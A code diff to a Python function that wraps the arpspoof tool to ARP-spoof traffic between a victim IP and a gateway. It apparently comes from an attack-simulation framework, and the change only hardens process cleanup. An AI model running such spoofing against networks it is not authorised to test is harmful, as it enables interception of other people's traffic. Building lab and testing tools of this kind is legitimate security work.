@@ -49,18 +49,27 @@ def run(
     def body():
         check_tools(["arpspoof"])
         cmd_victim, cmd_gateway = build_commands(interface, victim_ip, gateway_ip)
-        proc_victim = subprocess.Popen(cmd_victim)
-        proc_gateway = subprocess.Popen(cmd_gateway)
+        procs: list[subprocess.Popen] = []
         try:
+            procs.append(subprocess.Popen(cmd_victim))
+            procs.append(subprocess.Popen(cmd_gateway))
             time.sleep(duration)
         finally:
-            for proc in (proc_victim, proc_gateway):
-                proc.terminate()
-            for proc in (proc_victim, proc_gateway):
+            for proc in procs:
+                try:
+                    proc.terminate()
+                except Exception:
+                    pass
+            for proc in procs:
                 try:
                     proc.wait(timeout=5)
                 except subprocess.TimeoutExpired:
-                    proc.kill()
-                    proc.wait()
+                    try:
+                        proc.kill()
+                        proc.wait()
+                    except Exception:
+                        pass
+                except Exception:
+                    pass
 
     return run_attack("arp_spoof", "arpspoof", attacker_ip, victim_ip, out_dir, params, body, dry_run)
